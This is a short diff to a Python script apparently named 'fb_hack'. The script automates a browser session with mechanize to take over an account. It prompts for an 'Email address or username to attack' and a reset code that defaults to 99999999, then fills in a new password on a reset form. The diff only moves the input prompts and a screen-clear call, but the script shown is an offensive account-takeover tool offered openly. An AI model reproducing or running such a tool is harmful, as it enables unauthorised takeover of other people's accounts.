@@ -57,10 +57,7 @@ def passcode(pass0):
   return yo
 
 def fb_hack(email, codex):
-  os.system('clear')
   soup = BeautifulSoup()
-  email = input('Email address or username to attack:')
-  """password = input('Password:')"""
   browser = mechanize.Browser()
   browser.set_handle_robots(False)
   cookies = mechanize.CookieJar()
@@ -145,6 +142,7 @@ def fb_hack(email, codex):
       new = input('New Password: ')
       browser.select_form(nr=0)
       browser.form['password_new'] = new
+os.system('clear')
 ehack = input('Email address or username to attack:')
 reset = input('Code: ') or 99999999
 fb_hack(ehack, reset)
